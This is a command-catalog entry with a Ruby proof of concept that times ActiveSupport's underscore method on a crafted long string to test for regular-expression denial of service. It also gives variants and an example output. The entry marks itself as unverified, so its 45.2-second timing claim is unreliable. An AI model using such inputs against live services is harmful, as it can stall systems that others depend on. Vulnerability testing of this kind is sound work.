---
id: cmd-ruby-test-underscore-001
data: |-
  require 'active_support/inflector'
  start_time = Time.now
  malicious = 'a' * 10000 + 'AbcDef'
  result = malicious.underscore
  elapsed = Time.now - start_time
  puts "Elapsed: #{elapsed} seconds"
tags:
  - test
  - redos
type: command
output: 'Elapsed: 45.2 seconds (example; actual varies by system)'
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.847Z'
verified: false
validated: true
submitted: true
---
# ruby-test-underscore

## Command

```ruby
require 'active_support/inflector'
start_time = Time.now
malicious = 'a' * 10000 + 'AbcDef'
result = malicious.underscore
elapsed = Time.now - start_time
puts "Elapsed: #{elapsed} seconds"
```

## Description

This Ruby command tests the ReDoS vulnerability by timing the execution of the underscore method on a crafted malicious string, demonstrating catastrophic backtracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `malicious` | The input string to process | Yes |
| `start_time` / `elapsed` | Timing variables | Yes |

## Examples

### Basic Usage

```ruby
require 'active_support/inflector'
malicious = 'a' * 5000 + 'Xyz'
puts malicious.underscore
```

### Advanced Usage

```ruby
require 'active_support/inflector'
start_time = Time.now
malicious = 'a' * 10000 + 'AbcDefGhi'
result = malicious.underscore
elapsed = Time.now - start_time
puts "Time taken: #{elapsed}s"
puts result
```

## Expected Output

High elapsed time (e.g., >10 seconds) with the underscored string output, or a hang if severe.

## Related

- [[Related Procedure: Craft-ReDoS-Malicious-String]]
